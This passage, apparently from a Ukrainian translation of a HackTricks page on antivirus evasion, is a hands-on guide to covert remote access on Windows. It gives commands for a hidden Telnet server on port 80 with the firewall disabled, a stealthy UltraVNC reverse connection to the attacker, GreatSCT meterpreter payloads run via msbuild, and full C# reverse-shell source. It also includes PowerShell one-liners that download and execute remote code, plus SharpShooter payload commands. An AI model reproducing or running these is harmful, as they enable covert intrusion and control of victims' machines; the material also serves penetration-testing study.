–Ü–Ω—à–∏–π —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, —è–∫–∏–π —Ä–æ–±–∏—Ç—å **—Ç–µ–∂ —Å–∞–º–µ**, - [**avred**](https://github.com/dobin/avred) –∑ –≤—ñ–¥–∫—Ä–∏—Ç–∏–º –≤–µ–±-—Å–µ—Ä–≤—ñ—Å–æ–º, —â–æ –ø—Ä–æ–ø–æ–Ω—É—î –ø–æ—Å–ª—É–≥–∏ –Ω–∞ [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **–°–µ—Ä–≤–µ—Ä Telnet**

–î–æ Windows10 –≤—Å—ñ –≤–µ—Ä—Å—ñ—ó Windows –ø–æ—Å—Ç–∞—á–∞–ª–∏—Å—è –∑ **—Å–µ—Ä–≤–µ—Ä–æ–º Telnet**, —è–∫–∏–π –º–æ–∂–Ω–∞ –±—É–ª–æ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ (—è–∫ –∞–¥–º—ñ–Ω—ñ—Å—Ç—Ä–∞—Ç–æ—Ä) –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
–ó—Ä–æ–±–∏—Ç–∏ –π–æ–≥–æ **–∑–∞–ø—É—Å–∫–æ–º** –ø—Ä–∏ –∑–∞–ø—É—Å–∫—É —Å–∏—Å—Ç–µ–º–∏ —Ç–∞ **–∑–∞–ø—É—Å—Ç–∏—Ç–∏** –π–æ–≥–æ –∑–∞—Ä–∞–∑:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**–ó–º—ñ–Ω—ñ—Ç—å –ø–æ—Ä—Ç telnet** (–ø—Ä–∏—Ö–æ–≤–∞–Ω–æ) —Ç–∞ –≤–∏–º–∫–Ω—ñ—Ç—å –±—Ä–∞–Ω–¥–º–∞—É–µ—Ä:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

–ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –π–æ–≥–æ –∑: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (–≤–∞–º –ø–æ—Ç—Ä—ñ–±–Ω—ñ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è bin, –∞ –Ω–µ –Ω–∞–ª–∞—à—Ç—É–≤–∞–Ω–Ω—è)

**–ù–ê –•–û–°–¢–Ü**: –í–∏–∫–æ–Ω–∞–π—Ç–µ _**winvnc.exe**_ —Ç–∞ –Ω–∞–ª–∞—à—Ç—É–π—Ç–µ —Å–µ—Ä–≤–µ—Ä:

* –£–≤—ñ–º–∫–Ω—ñ—Ç—å –æ–ø—Ü—ñ—é _Disable TrayIcon_
* –í—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å –ø–∞—Ä–æ–ª—å –≤ _VNC Password_
* –í—Å—Ç–∞–Ω–æ–≤—ñ—Ç—å –ø–∞—Ä–æ–ª—å –≤ _View-Only Password_

–ü–æ—Ç—ñ–º –ø–µ—Ä–µ–º—ñ—Å—Ç—ñ—Ç—å –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª _**winvnc.exe**_ —Ç–∞ **–Ω–æ–≤–æ—Å—Ç–≤–æ—Ä–µ–Ω–∏–π** —Ñ–∞–π–ª _**UltraVNC.ini**_ –≤—Å–µ—Ä–µ–¥–∏–Ω—É **–∂–µ—Ä—Ç–≤–∏**

#### **–ó–≤–æ—Ä–æ—Ç–Ω–µ –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è**

**–ê—Ç–∞–∫—É—é—á–∏–π** –ø–æ–≤–∏–Ω–µ–Ω **–≤–∏–∫–æ–Ω–∞—Ç–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ** —Å–≤–æ–≥–æ **—Ö–æ—Å—Ç–∞** –±—ñ–Ω–∞—Ä–Ω–∏–π —Ñ–∞–π–ª `vncviewer.exe -listen 5900`, —â–æ–± –≤—ñ–Ω –±—É–≤ **–≥–æ—Ç–æ–≤–∏–π** –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –∑–≤–æ—Ä–æ—Ç–Ω–æ–≥–æ **VNC –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è**. –ü–æ—Ç—ñ–º –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ **–∂–µ—Ä—Ç–≤–∏**: –ó–∞–ø—É—Å—Ç—ñ—Ç—å –¥–µ–º–æ–Ω–∞ winvnc `winvnc.exe -run` —Ç–∞ –∑–∞–ø—É—Å—Ç—ñ—Ç—å `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**–£–í–ê–ì–ê:** –©–æ–± –∑–±–µ—Ä–µ–≥—Ç–∏ –Ω–µ–≤–∏–¥–∏–º—ñ—Å—Ç—å, –≤–∞–º –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ –Ω–µ —Ä–æ–±–∏—Ç–∏ –∫—ñ–ª—å–∫–∞ —Ä–µ—á–µ–π

* –ù–µ –∑–∞–ø—É—Å–∫–∞–π—Ç–µ `winvnc`, —è–∫—â–æ –≤—ñ–Ω –≤–∂–µ –ø—Ä–∞—Ü—é—î, –∞–±–æ –≤–∏ –≤–∏–∫–ª–∏—á–µ—Ç–µ [—Å–ø–ª–∏–≤–∞—é—á–µ –≤—ñ–∫–Ω–æ](https://i.imgur.com/1SROTTl.png). –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —á–∏ –≤—ñ–Ω –ø—Ä–∞—Ü—é—î –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `tasklist | findstr winvnc`
* –ù–µ –∑–∞–ø—É—Å–∫–∞–π—Ç–µ `winvnc` –±–µ–∑ `UltraVNC.ini` –≤ —Ç—ñ–π —Å–∞–º—ñ–π —Ç–µ–∫–∏, —ñ–Ω–∞–∫—à–µ –≤—ñ–¥–∫—Ä–∏—î—Ç—å—Å—è [–≤—ñ–∫–Ω–æ –∫–æ–Ω—Ñ—ñ–≥—É—Ä–∞—Ü—ñ—ó](https://i.imgur.com/rfMQWcf.png)
* –ù–µ –∑–∞–ø—É—Å–∫–∞–π—Ç–µ `winvnc -h` –¥–ª—è –¥–æ–ø–æ–º–æ–≥–∏, –∞–±–æ –≤–∏ –≤–∏–∫–ª–∏—á–µ—Ç–µ [—Å–ø–ª–∏–≤–∞—é—á–µ –≤—ñ–∫–Ω–æ](https://i.imgur.com/oc18wcu.png)

### GreatSCT

–ó–∞–≤–∞–Ω—Ç–∞–∂—Ç–µ –π–æ–≥–æ –∑: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
–£—Å–µ—Ä–µ–¥–∏–Ω—ñ GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
–ó–∞—Ä–∞–∑ **–∑–∞–ø—É—Å—Ç—ñ—Ç—å –ø—Ä–æ—Å–ª—É—Ö–æ–≤—É–≤–∞—á** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é `msfconsole -r file.rc` —Ç–∞ **–≤–∏–∫–æ–Ω–∞–π—Ç–µ** **xml payload** –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**–ü–æ—Ç–æ—á–Ω–∏–π –∑–∞—Ö–∏—Å–Ω–∏–∫ –¥—É–∂–µ —à–≤–∏–¥–∫–æ –∑–∞–≤–µ—Ä—à–∏—Ç—å –ø—Ä–æ—Ü–µ—Å.**

### –ö–æ–º–ø—ñ–ª—è—Ü—ñ—è –Ω–∞—à–æ–≥–æ –≤–ª–∞—Å–Ω–æ–≥–æ –∑–≤–æ—Ä–æ—Ç–Ω—å–æ–≥–æ —à–µ–ª—É

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### –ü–µ—Ä—à–∏–π C# –∑–≤–æ—Ä–æ—Ç–Ω—ñ–π —à–µ–ª

–°–∫–æ–º–ø—ñ–ª—é–π—Ç–µ –π–æ–≥–æ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
–í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ —Ü–µ –∑:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –∫–æ–º–ø—ñ–ª—è—Ç–æ—Ä–∞
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

–ê–≤—Ç–æ–º–∞—Ç–∏—á–Ω–µ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è —Ç–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

–°–ø–∏—Å–æ–∫ –æ–±—Ñ—É—Å–∫–∞—Ç–æ—Ä—ñ–≤ C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### –í–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è python –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –ø—Ä–∏–∫–ª–∞–¥—ñ–≤ —ñ–Ω'—î–∫—Ç–æ—Ä—ñ–≤:

* [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### –Ü–Ω—à—ñ —ñ–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∏
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### –ë—ñ–ª—å—à–µ

* [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ —Å–≤–æ—é **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—ñ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub**.

</details>
